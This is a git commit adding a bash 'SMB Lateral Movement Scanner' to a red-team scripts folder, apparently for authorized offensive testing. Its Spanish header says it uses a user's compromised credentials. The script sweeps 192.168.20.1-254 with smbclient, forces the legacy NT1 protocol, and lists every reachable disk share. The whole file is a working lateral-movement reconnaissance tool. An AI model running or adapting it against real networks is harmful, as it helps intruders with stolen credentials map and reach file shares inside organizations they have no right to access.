d3076d124bcd65fb9dbf7288f02c692535dad09e
Pierrelambert758 <pierrelambert758@gmail.com>
2026-05-14 10:37:38 +0200

    Update smb_lateral_scanner.sh

--- scripts/red-team/smb_lateral_scanner.sh
+++ scripts/red-team/smb_lateral_scanner.sh
@@ -1,1 +1,34 @@
+#!/bin/bash
+#
+# ByteCat - SMB Lateral Movement Scanner
+# Autor: Noemí Fernández (2026)
+#
+# Escanea hosts corporativos y enumera recursos SMB accesibles
+# usando las credenciales comprometidas del usuario.
+#
+
+USER="$1"
+PASS="$2"
+
+if [ -z "$USER" ] || [ -z "$PASS" ]; then
+    echo "Uso: $0 usuario contraseña"
+    exit 1
+fi
+
+echo "=== ByteCat SMB Scanner ==="
+for HOST in $(seq 1 254); do
+    IP="192.168.20.$HOST"
+    echo -n "[*] Probing $IP ... "
+
+    smbclient -L "//$IP" -U "$USER%$PASS" --option='client min protocol=NT1' -g 2>/dev/null | grep "Disk" >/dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "ACCESIBLE"
+        echo "[+] Recursos compartidos:"
+        smbclient -L "//$IP" -U "$USER%$PASS" --option='client min protocol=NT1' -g | grep "Disk"
+        echo
+    else
+        echo "No accesible"
+    fi
+done
 
